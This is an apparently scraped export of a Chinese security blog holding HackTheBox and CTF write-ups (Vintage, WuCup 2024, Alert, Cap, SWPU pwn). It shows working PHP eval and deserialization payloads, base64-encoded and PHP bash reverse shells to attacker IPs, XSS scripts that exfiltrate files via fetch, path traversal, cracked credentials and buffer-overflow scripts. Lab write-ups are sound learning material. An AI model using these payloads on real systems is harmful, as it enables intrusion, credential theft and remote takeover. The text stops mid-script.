impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [*] SMBv3.0 dialect used\r[!] Launching semi-interactive shell - Careful what you execute\r[!] Press help for extra shell commands\rC:\\\u0026gt; whoami\rvintage\\l.bianchi_adm\rC:\\\u0026gt; type Users\\Administrator\\Desktop\\root.txt Summary #\rç”±äºKerberosçš„è®¤è¯æœºåˆ¶å¯¹æ—¶åŒºå’Œç³»ç»Ÿæ—¶é—´éªŒè¯éå¸¸ä¸¥æ ¼ï¼Œåœ¨æ“ä½œçš„è¿‡ç¨‹ä¸­ï¼Œæ¯”å¦‚BloodyADæˆ–è€…impacketçš„ç›¸å…³è„šæœ¬ä½¿ç”¨æ—¶ï¼Œå¦‚æœæ²¡æœ‰ç”¨ntupdateåŒæ­¥æ—¶é—´ï¼Œä¼šå¯¼è‡´å‘½ä»¤å¤±è´¥ã€‚æˆ‘ä¹Ÿæ˜¯ååˆ†è‰°éš¾çš„åœ¨è¿›è¡Œå¤ç°ã€‚\næœ¬æ–‡ä¹Ÿæ˜¯æ ¹æ®åˆ«äººçš„WPè¿›è¡Œå¤ç°ï¼Œå­¦ä¹ åˆ°äº†å¾ˆå¤šæ–°çš„å·¥å…·ä»¥åŠæ€è·¯ï¼šBloodhoundã€bloodyADã€ldapä¿¡æ¯æšä¸¾ä»¥åŠImpacketç³»åˆ—çš„Kerberosç›¸å…³çš„æ“ä½œã€‚\næ€»çš„æ¥è¯´ç†è§£è¿˜æ˜¯éå¸¸æµ…æ˜¾ï¼Œæˆ‘è‡ªå·±è‚¯å®šæ˜¯æ‰“ä¸äº†çš„ï¼Œåªèƒ½é€šè¿‡å¤ç°æ¥å­¦ä¹ å­¦ä¹ æ€è·¯ã€‚\nI HATE WINDOWS!!!\n","date":"2024-12-03","externalUrl":null,"permalink":"/posts/2024/12/hackthebox-vintage/","section":"Posts","summary":"","title":"HTB-Vintage","type":"posts"},{"content":"","date":"2024-12-01","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"\rWeb #\rSign #\ré¢˜ç›®ä»‹ç»:Â POSTæµ…æµ…ç­¾ä¸ªåˆ°å§\nHelloHacker #\ré¢˜ç›®ä»‹ç»:Â ä½ çœ‹åˆ°çš„ä¸ä¸€å®šæ˜¯çœŸçš„\næºç å¦‚ä¸‹\n\u0026lt;?php\rhighlight_file(__FILE__);\rerror_reporting(0);\rinclude_once \u0026#39;check.php\u0026#39;;\rinclude_once \u0026#39;ban.php\u0026#39;;\r$incompetent = $_POST[\u0026#39;incompetent\u0026#39;];\r$WuCup = $_POST[\u0026#39;WuCup\u0026#39;];\rif ($incompetent !== \u0026#39;HelloHacker\u0026#39;) {\rdie(\u0026#39;Come invade!\u0026#39;);\r}\r$required_chars = [\u0026#39;p\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;z\u0026#39;];\r$is_valid = true;\rif (!checkRequiredChars($WuCup, $required_chars)) {\r$is_valid = false;\r}\rif ($is_valid) {\r$prohibited_file = \u0026#39;prohibited.txt\u0026#39;;\rif (file_exists($prohibited_file)) {\r$file = fopen($prohibited_file, \u0026#39;r\u0026#39;);\rwhile ($line = fgets($file)) {\r$line = rtrim($line, \u0026#34;\\r\\n\u0026#34;); if ($line === \u0026#39;\u0026#39; \u0026amp;\u0026amp; strpos($WuCup, \u0026#39; \u0026#39;) === false) {\rcontinue;\r}\rif (stripos($WuCup, $line) !== false) {\rfclose($file); die(\u0026#39;this road is blocked\u0026#39;);\r}\r}\rfclose($file); }\reval($WuCup);\r} else {\rdie(\u0026#39;NOï¼NOï¼NOï¼\u0026#39;);\r}\r?\u0026gt; ç®€å•åˆ†æä¸€ä¸‹ï¼Œpostçš„å‚æ•°ä¸­incompetentæ˜¯HelloHacker\nWuCupå¿…é¡»åŒ…å«æ•°ç»„ä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼Œå¹¶ä¸”æœ‰ä¸€å®šçš„æ’åˆ—ç»„åˆ\nprohibited.txtæ˜¯å¯ä»¥è®¿é—®çš„ï¼Œå°†å…¶å¤åˆ¶ä¸‹æ¥\nimport itertools\r# å¯èƒ½çš„å­—æ¯\rletters = \u0026#39;pevanxorz\u0026#39;\r# æ‰€æœ‰å¯èƒ½çš„æ’åˆ—ç»„åˆ\rall_combinations = {\u0026#39;\u0026#39;.join(p) for p in itertools.permutations(letters)}\r# ä»æ–‡ä»¶ä¸­è¯»å–ç°æœ‰ç»„åˆ\rexisting_combinations = set()\rwith open(\u0026#39;prohibited.txt\u0026#39;, \u0026#39;r\u0026#39;) as file:\rfor line in file:\rexisting_combinations.add(line.strip())\r# æŸ¥æ‰¾ç¼ºå¤±çš„ç»„åˆ\rmissing_combinations = all_combinations - existing_combinations\r# è¾“å‡ºç¼ºå¤±çš„ç»„åˆ\rprint(f\u0026#39;ç¼ºå¤±çš„ç»„åˆæ•°é‡: {len(missing_combinations)}\u0026#39;)\rfor combo in missing_combinations:\rprint(combo) ç„¶åè¿›å…¥å‘½ä»¤æ‰§è¡Œï¼Œä¸€äº›ç‰¹æ®Šå­—ç¬¦åœ¨prohibited.txtä¸­è¢«è¿‡æ»¤æ‰äº†\npassthruæ˜¯å¯ä»¥ä½¿ç”¨çš„\nincompetent=HelloHacker\u0026amp;WuCup=oxzverapn;passthru(\u0026#34;$_POST[a]\u0026#34;);\u0026amp;a=cat /flag TimeCage #\ré¢˜ç›®ä»‹ç»:Â ä½ çŸ¥é“æ—¶é—´å—ï¼Ÿ\n\u0026lt;?php\rshow_source(__FILE__);\rinclude \u0026#39;secret.php\u0026#39;;\rif(isset($_GET[\u0026#39;input\u0026#39;])){\r$guess = $_GET[\u0026#39;input\u0026#39;];\r$target = random_int(114 , 114 + date(\u0026#39;s\u0026#39;) * 100000);\rif(intval($guess) === intval($target)){\recho \u0026#34;The next challenge in \u0026#34;.$key1;\r}\relse{\recho \u0026#34;Guess harder.\u0026#34;;\r}\r} è¿™é‡Œçš„éšæœºæ•°èŒƒå›´ï¼Œåªéœ€è¦ç­‰å¾…æ—¶é—´åˆ°è¾¾0ç§’ï¼Œé‚£ä¹ˆtargetå°±æ˜¯114\nå¯ä»¥åœ¨50å¤šç§’çš„æ—¶å€™ç”¨bpå‘åŒ…\nè¿›å…¥ç¬¬äºŒå±‚\n\u0026lt;?php\rshow_source(__FILE__);\rinclude \u0026#39;secret.php\u0026#39;;\rif(isset($_POST[\u0026#39;pass\u0026#39;])){\r$pass = $_POST[\u0026#39;pass\u0026#39;];\rif(strlen($pass) != strlen($password)){\rdie(\u0026#34;Wrong Length!\u0026#34;);\r}\r$isMatch = true;\rfor($i = 0;$i \u0026lt; strlen($password); $i++){\rif($pass[$i] != $password[$i]){\r$isMatch = false;\rbreak;\r}\rsleep(1);\r}\rif($isMatch){\recho \u0026#34;The final challenge in \u0026#34;.$key2;\r}\relse{\recho \u0026#34;Wrong Pass!\u0026#34;;\r}\r}\r//Only digital characters in the password. å°±æ˜¯çŒœæ•°å­—ï¼Œå¯¹æ¯ä¸€ä½è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ­£ç¡®å°±ä¼šåœç•™ä¸€ç§’ï¼Œè¿™é‡Œå¯ä»¥å†™è„šæœ¬ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹æ³¨\nimport requests\rimport time\rimport random\rurl=\u0026#34;http://challenge.wucup.cn:49820/Trapping2147483647.php\u0026#34;\rpasswd=\u0026#39;56983215\u0026#39;\rpayload={\u0026#34;pass\u0026#34;:passwd}\rstart=time.time()\rreq=requests.post(url,data=payload)\rend=time.time()\rprint(req.text)\rprint(end-start) æœ€ç»ˆå¾—åˆ°çš„passwdå°±æ˜¯56983215\nè¿›å…¥ç¬¬ä¸‰å±‚\n\u0026lt;?php\rif(isset($_POST[\u0026#39;cmd\u0026#39;])){\r$cmd = $_POST[\u0026#39;cmd\u0026#39;];\r$pattern = \u0026#39;/[\\{\\}\\[\\]\\(\\)\u0026amp;\u0026lt;\u0026gt;`\\s\\\\\\\\]/\u0026#39;;\rif(preg_match($pattern,$cmd)){\rdie(\u0026#34;Invalid Input!\u0026#34;);\r}\rshell_exec($cmd);\r}\relse{\rshow_source(__FILE__);\r}\r//flag is in /flag ç”±äºè¿™é‡Œshell_execæ˜¯æ— å›æ˜¾çš„ï¼Œæˆ‘ä½¿ç”¨çš„æ–¹å¼æ˜¯bashåå¼¹shellåˆ°æœåŠ¡å™¨ä¸Š\nHYHçš„åå¼¹Shellç”Ÿæˆå™¨ (hyhforever.top) cmd=echo$IFS$1\u0026#34;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ5LjIzNS4xNjQuMTA0LzEwMCAwPiYx\u0026#34;|base64$IFS$1-d|bash å¾—åˆ°flag\nezPHP #\rç½‘ç«™æ‰«ææ‰«åˆ°äº†ï¼šflag.phpã€hint.php\nå‚è€ƒè¿™ç¯‡æ–‡ç« \nphpï¼œ= 7 . 4 . 21 development serveræºç æ³„éœ²æ¼æ´å¤ç° - å‡ªç™½Kw - åšå®¢å›­ (cnblogs.com) å…³æ‰burpçš„Update Content-Length\nGET /flag.php HTTP/1.1\rHost: challenge.wucup.cn:48919\rGET /Kawakaze HTTP/1.1 å¾—åˆ°flag.phpçš„æºç \n\u0026lt;?php\rerror_reporting(0);\rclass a{\rpublic $OAO;\rpublic $QAQ;\rpublic $OVO;\rpublic function __toString(){\rif(!preg_match(\u0026#39;/hello/\u0026#39;, OVO)){\rif ($this-\u0026gt;OVO === \u0026#34;hello\u0026#34;) {\rreturn $this-\u0026gt;OAO-\u0026gt;QAQ;\r}\t}\r}\rpublic function __invoke(){\rreturn $this-\u0026gt;OVO;\r}\r}\rclass b{\rpublic $pap;\rpublic $vqv;\rpublic function __get($key){\r$functioin = $this-\u0026gt;pap;\rreturn $functioin();\r}\rpublic function __toString(){\rreturn $this-\u0026gt;vqv;\r}\r}\rclass c{\rpublic $OOO;\rpublic function __invoke(){\r@$_ = $this-\u0026gt;OOO;\r$___ = $_GET;\rvar_dump($___);\rif (isset($___[\u0026#39;h_in.t\u0026#39;])) {\runset($___[\u0026#39;h_in.t\u0026#39;]);\r}\rvar_dump($___);\recho @call_user_func($_, ...$___); }\r}\rclass d{\rpublic $UUU;\rpublic $uuu;\rpublic function __wakeup(){\recho $this-\u0026gt;UUU;\r}\rpublic function __destruct(){\r$this-\u0026gt;UUU;\r}\r}\rif(isset($_GET[\u0026#39;h_in.t\u0026#39;])){\runserialize($_GET[\u0026#39;h_in.t\u0026#39;]);\r}\r?\u0026gt; ç®€å•åˆ†æä¸€ä¸‹\nd-\u0026gt;__wakeup\ra-\u0026gt;__toString\rb-\u0026gt;__get\rc-\u0026gt;__invoke h_in.tç”¨ä¸­æ‹¬å·ç»•è¿‡\nåœ¨phpinfoé‡Œé¢å¯ä»¥çœ‹åˆ°å‡ ä¹æ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«ç¦æ­¢äº†\nå¯ä»¥ä½¿ç”¨file_get_contentså‡½æ•°ç»•è¿‡ï¼Œç›´æ¥æ‰“å°å†…å®¹\n\u0026lt;?php\rclass a\r{\rpublic $OAO;\rpublic $QAQ;\rpublic $OVO=\u0026#34;hello\u0026#34;;\r}\rclass b\r{\rpublic $pap;\rpublic $vqv;\r}\rclass c\r{\rpublic $OOO=\u0026#34;file_get_contents\u0026#34;;\r}\rclass d\r{\rpublic $UUU;\rpublic $uuu;\r}\r$d=new d();\r$a=new a();\r$b=new b();\r$d-\u0026gt;UUU=$a;\r$a-\u0026gt;OAO=$b;\r$c=new c();\r$b-\u0026gt;pap=$c;\recho serialize($d);\r#O:1:\u0026#34;d\u0026#34;:2:{s:3:\u0026#34;UUU\u0026#34;;O:1:\u0026#34;a\u0026#34;:3:{s:3:\u0026#34;OAO\u0026#34;;O:1:\u0026#34;b\u0026#34;:2:{s:3:\u0026#34;pap\u0026#34;;O:1:\u0026#34;c\u0026#34;:1:{s:3:\u0026#34;OOO\u0026#34;;s:17:\u0026#34;file_get_contents\u0026#34;;}s:3:\u0026#34;vqv\u0026#34;;N;}s:3:\u0026#34;QAQ\u0026#34;;N;s:3:\u0026#34;OVO\u0026#34;;s:5:\u0026#34;hello\u0026#34;;}s:3:\u0026#34;uuu\u0026#34;;N;} æ‹¿åˆ°flag\nCrypto #\rEasy #\ræŠŠä¸¤ä¸ªä»£ç æ‰”ç»™AIï¼Œåˆ†æåç»™å‡ºè„šæœ¬\ndef rc4(key, data):\rS = list(range(256))\rkey_length = len(key)\rj = 0\r# Key Scheduling Algorithm (KSA)\rfor i in range(256):\rj = (j + S[i] + ord(key[i % key_length])) % 256\rS[i], S[j] = S[j], S[i]\r# Pseudo-Random Generation Algorithm (PRGA)\ri = 0\rj = 0\routput = []\rfor m in range(len(data)):\ri = (i + 1) % 256\rj = (j + S[i]) % 256\rS[i], S[j] = S[j], S[i]\routput.append(data[m] ^ S[(S[i] + S[j]) % 256])\rreturn bytes(output)\r# Given key and hex-encoded flag\rkey = \u0026#34;hello world\u0026#34;\rhex_flag = \u0026#34;d8d2963e0d8ab8533d2a7fe296c5292339246eba0d292d5752578359322c3a77892dfa7261b84f\u0026#34;\r# Convert hex string to byte array\rflag_bytes = bytes.fromhex(hex_flag)\r# Decrypt the flag\rdecrypted_flag = rc4(key, flag_bytes)\rprint(\u0026#34;Decrypted flag:\u0026#34;, decrypted_flag.decode()) Misc #\rSign #\rCyberchefç›´æ¥è§£å¯†\næ—‹è½¬æœ¨é©¬ #\rflag1å’Œflag2éƒ½éå¸¸å¤§ï¼Œä¸å¥½ç›´æ¥æ‰“å¼€\nè¯»å–å‰1000ä¸ªå­—ç¬¦å°è¯•è§£å¯†\nä¼¼ä¹åƒæ˜¯base64åµŒå¥—è§£å¯†\nå°è¯•æŠŠflag1å’Œflag2è¿æ¥èµ·æ¥è¿›è¡Œè§£å¯†\næ¯æ¬¡è§£å¯†åéƒ½å†™å…¥flag.txt\næœ€åå¾—åˆ°çš„æ•°å­—æ‹¿å»cyberchefè§£å¯†\nå¤ªæ #\rä»ç¬¬ä¸‰ä¸ªç‚¹ä¸­å¯ä»¥å‘ç°\ntai ji sheng liang yi\rå¤ªåœ¨ç¬¬ä¸€ä½å–t\ræåœ¨ç¬¬äºŒä½å–i\rç”Ÿåœ¨ç¬¬ä¸‰ä½å–e\rä¸¤åœ¨ç¬¬å››ä½å–n\rä»ªåœ¨ç¬¬äº”ä½å–iï¼Œä½†æ˜¯ç¬¬å››ç‚¹ä¸­çœ‹åˆ°æ˜¯å–y\rå¤ªæç”Ÿä¸¤ä»ª-ä¸¤ä»ªç”Ÿå››è±¡-å››è±¡ç”Ÿå…«å¦-å…«å¦å®šå‰å‡¶-å‰å‡¶ç”Ÿå¤§ä¸š\rå¯¹åº”å¾—åˆ°ä¸‹é¢çš„flag\rWuCup{tieny-lieig-sieau-bunig-jieay} ","date":"2024-12-01","externalUrl":null,"permalink":"/posts/2024/12/%E5%90%BE%E6%9D%AF-2024/","section":"Posts","summary":"","title":"WuCup-2024","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap Scan #\rnmap alert.htb -sC -sV -T4 -Pn å¼€æ”¾ç«¯å£ï¼š22ã€80ï¼Œhttpserveræ˜¯Apache\nè¿›å…¥80ç«¯å£çš„ç½‘é¡µï¼Œå‘ç°å­˜åœ¨Markdownæ–‡ä»¶ä¸Šä¼ \næ ¹æ®é¢˜ç›®åç§°AlertçŒœæµ‹ï¼Œåº”è¯¥ä¸XSSæ¼æ´æœ‰å…³\nSubdomain Fuzz #\rffuf -w main.txt -u http://alert.htb -H \u0026#34;Host:FUZZ.alert.htb\u0026#34; -ac å‘ç°å­˜åœ¨statisticsçš„å­åŸŸå\nXSS #\rè¿™ä¸ªæ˜¯é€šè¿‡XSSè¯»å–åˆ°message.phpçš„å†…å®¹ã€‚å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š\nä½¿ç”¨è¿™ä¸ªè½½è·ï¼Œè¿™ä¸ªæ˜¯é¢„è§ˆmdçš„æ—¶å€™çš„URLæ¨¡æ¿ï¼ŒæŠŠpageè®¾ç½®ä¸ºmessagesã€‚\n\u0026lt;script\u0026gt;\rfetch(\u0026#34;http://alert.htb/index.php?page=messages\u0026#34;)\r.then(response =\u0026gt; response.text()) // Convert the response to text\r.then(data =\u0026gt; {\rfetch(\u0026#34;http://10.10.16.90/?data=\u0026#34; + encodeURIComponent(data));\r})\r.catch(error =\u0026gt; console.error(\u0026#34;Error fetching the messages:\u0026#34;, error));\r\u0026lt;/script\u0026gt; ç„¶åå¦èµ·ä¸€ä¸ªpython -m http.server 80ï¼Œä¼šæ”¶åˆ°URLåŠ å¯†åçš„é¡µé¢å†…å®¹\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt;\r\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/style.css\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;Alert - Markdown Viewer\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;nav\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=alert\u0026#34;\u0026gt;Markdown Viewer\u0026lt;/a\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=contact\u0026#34;\u0026gt;Contact Us\u0026lt;/a\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=about\u0026#34;\u0026gt;About Us\u0026lt;/a\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=donate\u0026#34;\u0026gt;Donate\u0026lt;/a\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=messages\u0026#34;\u0026gt;Messages\u0026lt;/a\u0026gt; \u0026lt;/nav\u0026gt;\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;Messages\u0026lt;/h1\u0026gt;\u0026lt;ul\u0026gt;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#39;messages.php?file=2024-03-10_15-48-34.txt\u0026#39;\u0026gt;2024-03-10_15-48-34.txt\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;footer\u0026gt;\r\u0026lt;p style=\u0026#34;color: black;\u0026#34;\u0026gt;Â© 2024 Alert. All rights reserved.\u0026lt;/p\u0026gt;\r\u0026lt;/footer\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°ç®¡ç†å‘˜æŸ¥çœ‹çš„æ—¶å€™æ˜¯æœ‰messages.php?fileè¿™ä¸ªå‚æ•°çš„ã€‚\nåœ¨markdownæ–‡ä»¶ä¸­æ’å…¥æœ‰æ•ˆè½½è·\n\u0026lt;script\u0026gt;\rfetch(\u0026#34;http://alert.htb/messages.php?file=filepath\u0026#34;)\r.then(response =\u0026gt; response.text())\r.then(data =\u0026gt; {\rfetch(\u0026#34;http://10.10.xx.xx:8888/?file_content=\u0026#34; + encodeURIComponent(data));\r});\r\u0026lt;/script\u0026gt; ç»è¿‡å°è¯•ï¼Œæ— æ³•ç›´æ¥è¯»å–åˆ°/etc/passwdè¿™ç§æ•æ„Ÿæ–‡ä»¶\nä½†æ˜¯è€ƒè™‘åˆ°webæœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯Apacheï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« \nä»€ä¹ˆæ˜¯.htpasswdæ–‡ä»¶ï¼Ÿ-CSDNåšå®¢ äºæ˜¯æœ‰æ•ˆè½½è·å°±ä¿®æ”¹ä¸ºäº†è¿™æ ·â†“\n\u0026lt;script\u0026gt;\rfetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd\u0026#34;)\r.then(response =\u0026gt; response.text())\r.then(data =\u0026gt; {\rfetch(\u0026#34;http://10.10.16.11:8888/?file_content=\u0026#34; + encodeURIComponent(data));\r});\r\u0026lt;/script\u0026gt; å°†å…¶ä¸Šä¼ åï¼Œå¤åˆ¶åˆ†äº«é“¾æ¥\nç„¶åè¿›å…¥åˆ°Contact Us\nç‚¹å‡»å‘é€ï¼Œä¼šåœ¨ç»ˆç«¯æ”¶åˆ°åŠ å¯†å­—ç¬¦ä¸²\n%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A\r\u0026lt;pre\u0026gt;albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/\u0026lt;/pre\u0026gt; è¿™çœ‹èµ·æ¥åƒæ˜¯ä¸€ç§hashåŠ å¯†\njohn --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long alert.hash ä½¿ç”¨SSHç™»å½•å¯ä»¥å¾—åˆ°User.txt\nPrivilege Escalation #\réå†ç›®å½•æ²¡æœ‰ä»€ä¹ˆå¯ç–‘æ–‡ä»¶ï¼Œå¹¶ä¸”å‘ç°å¦ä¸€ä¸ªç”¨æˆ·david\nä¸Šä¼ linpeasï¼Œå‘ç°8080æ˜¯æ‰“å¼€çš„\nå°†ç«¯å£è½¬å‘å‡ºæ¥\nssh -L 8080:127.0.0.1:8080 albert@alert.htb åœ¨/optç›®å½•ä¸‹å‘ç°è¿™ä¸ªWebsite Monitorçš„æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”æ˜¯æœ‰rootæƒé™çš„\n\u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;/dev/tcp/10.10.16.11/100 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; å†™å…¥åå¼¹Shellçš„æœ¨é©¬ï¼Œå¹¶ä¸”è®¾ç½®ç›‘å¬\nå°è¯•è®¿é—®ä¸‹é¢è¿™ä¸ªè·¯å¾„\nhttp://127.0.0.1:8080/config/hyh.php å¾—åˆ°åå¼¹Shellï¼Œæ‹¿åˆ°Rootæƒé™\nSummary #\rè¿™ä¸ªXSSæ¼æ´ä¸ä»¥å¾€CTFä¸­é‡åˆ°çš„XSSæœ‰ç‚¹ä¸ä¸€æ ·\nä»–å¹¶ä¸æ˜¯ç”¨æ¥çªƒå–èº«ä»½å‡­è¯ï¼Œè€Œæ˜¯ç”¨æ¥è¿›è¡Œä¸»åŠ¨è®¿é—®ï¼Œå°†ä¿¡æ¯å¤–å¸¦\n","date":"2024-11-30","externalUrl":null,"permalink":"/posts/2024/11/htb-alert/","section":"Posts","summary":"","title":"HTB-Alert","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy User.txt #\rè¿›å…¥ç½‘é¡µï¼Œç‚¹å‡»Security Snapshotï¼Œå¯ä»¥çœ‹åˆ°urlè¿›å…¥åˆ°äº†/data/4ï¼Œä¸‹é¢å­˜åœ¨downloadè·¯ç”±ï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥ï¼Œå¹¶æ²¡æœ‰ä»»ä½•ä¸œè¥¿\nå°è¯•éå†/dataç›®å½•ä¸‹çš„æ•°å­—ï¼Œåœ¨/data/0å‘ç°ä¸åŒçš„æ–‡ä»¶\nä½¿ç”¨wiresharkè¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°åœ¨FTPåè®®ä¸­å­˜åœ¨è´¦æˆ·ä¿¡æ¯æ˜æ–‡æ³„éœ²\nuser: nathan\rpass: Buck3tH4TF0RM3! å¯ä»¥ä½¿ç”¨sshç›´æ¥ç™»å½•ï¼Œè·å–åˆ°user.txt\nRoot.txt #\rä¸Šä¼ linpeas.sh\nåœ¨Files with capabilitiesï¼Œä¸­å‘ç°python3.8è¿™ä¸ªæ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨setuidæ¥è¿›è¡Œåˆ‡æ¢ç”¨æˆ·\né‚£ä¹ˆå¯ä»¥å°†uidè®¾ç½®ä¸º0ï¼ˆrootçš„uidé€šå¸¸ä¸º0ï¼‰ï¼Œç„¶åå»æ‰§è¡Œbash\npython3 -c \u0026#34;import os;os.setuid(0);os.system(\u0026#39;/bin/bash\u0026#39;)\u0026#34; Summary #\rè¿™ä¸ªCapæœºå™¨ç¡®å®ç®€å•å“ˆï¼Œå¥½ä¹…æ²¡æ‰“HTBçš„é¶æœºäº†ï¼Œå‰æ®µæ—¶é—´åˆåœ¨æ‰“CTFï¼Œæœ€æ–°çš„é¶æœºæ„Ÿè§‰éš¾åº¦åˆæ¯”è¾ƒé«˜ã€‚\n","date":"2024-11-24","externalUrl":null,"permalink":"/posts/2024/11/hackthebox-cap/","section":"Posts","summary":"","title":"HTB-Cap","type":"posts"},{"content":"","date":"2024-11-24","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"2024-11-24","externalUrl":null,"permalink":"/tags/swpu/","section":"Tags","summary":"","title":"Swpu","type":"tags"},{"content":"\rå‰è¨€ #\rä¹‹å‰å­¦ä¹ è¿‡ä¸€æ®µæ—¶é—´Pwnï¼Œåé¢å°±ä¸¢æ‰äº†ï¼Œå†é‡æ–°å›æ¥è¡¥ä¸€è¡¥\nç­¾åˆ° #\rchecksecæ£€æŸ¥ä¸€ä¸‹\nç”¨64ä½IDAæ‰“å¼€\nç®€å•çš„æ ˆæº¢å‡ºï¼Œbackdoorçš„ä½ç½®ç›´æ¥ç»™äº†\nå†™è„šæœ¬å¦‚ä¸‹ï¼Œbufçš„é•¿åº¦å°±åªæœ‰48ï¼ŒåŠ ä¸Š8ä½çš„æŒ‡é’ˆï¼Œè¾¾åˆ°backdoorçš„ä½ç½®\nfrom pwn import *\rio=remote(\u0026#34;node4.anna.nssctf.cn\u0026#34;,28296)\rtarget=0x000000000040123A\rpayload=b\u0026#39;a\u0026#39;*(48+8)+p64(target)\rio.sendline(payload)\rio.interactive() guess me #\ré¢˜ç›®æ²¡æœ‰é™„ä»¶ï¼Œå…ˆç›´æ¥è¿æ¥çœ‹çœ‹\næ˜¯ä¸€ä¸ªç®€å•çš„çŒœæ•°å­—ï¼Œè®©AIè·‘ä¸€ä¸ªäºŒåˆ†æ³•çš„è„šæœ¬å³å¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ‰‹æ³¨ï¼Œè¿™é‡Œåº”è¯¥æ˜¯è€ƒå¯Ÿpwntoolsçš„ä½¿ç”¨\nfrom pwn import *\r# è¿æ¥åˆ°è¿œç¨‹æœåŠ¡\rio = remote(\u0026#34;node4.anna.nssctf.cn\u0026#34;, 28024)\r# è¯»å–åˆå§‹è¡Œ\rprint(io.recvuntil(b\u0026#39;:\u0026#39;))\r# äºŒåˆ†æ³•æŸ¥æ‰¾ 0 åˆ° 100 ä¹‹é—´çš„æ•°å­—\rlow, high = 0, 100\rwhile low \u0026lt;= high:\rmid = (low + high) // 2\rio.sendline(str(mid).encode()) # å‘é€çŒœæµ‹çš„æ•°å­—\rresponse = io.recvline() # è·å–æœåŠ¡å™¨çš„å“åº”\r# æ‰“å°å½“å‰çŒœæµ‹åŠå…¶å“åº”\rprint(f\u0026#34;Guess: {mid}, Response: {response.decode().strip()}\u0026#34;)\r# æ£€æŸ¥å“åº”å¹¶è°ƒæ•´æœç´¢èŒƒå›´\rif b\u0026#39;Bingo!\u0026#39; in response: # æ£€æŸ¥æ˜¯å¦çŒœå¯¹äº†\rio.interactive()\rbreak\relif b\u0026#39;too big\u0026#39; in response:\rhigh = mid - 1 # è°ƒæ•´ä¸Šç•Œ\relif b\u0026#39;too small\u0026#39; in response:\rlow = mid + 1 # è°ƒæ•´ä¸‹ç•Œ\relse:\rprint(\u0026#34;Unexpected response:\u0026#34;, response.decode().strip())\rbreak buy #\rchecksecæ£€æŸ¥\nè¿›å…¥IDAåˆ†æï¼Œè¦æ»¡è¶³keyçš„æ¡ä»¶æ‰èƒ½è¿›å…¥åé—¨å‡½æ•°\nåœ¨foodå‡½æ•°ä¸­ï¼Œå­˜åœ¨keyçš„èµ‹å€¼è¯­å¥\nä¸è¿‡ä»”ç»†çœ‹ï¼Œmoneyæ˜¯ç”±v1æ¥å†³å®šï¼Œè€Œv1ä¸èƒ½å¤§äº3ï¼ŒæŠŠv1è®¾ç½®ä¸ºä¸€ä¸ªè´Ÿæ•°å°±èƒ½è·å–åˆ°money\nè¿›å…¥doorå‡½æ•°åå°±æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡º\nåœ¨mygifté‡Œæ‰¾åˆ°/bin/shçš„åœ°å€\nå†™è„šæœ¬\nfrom pwn import *\rio = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;, 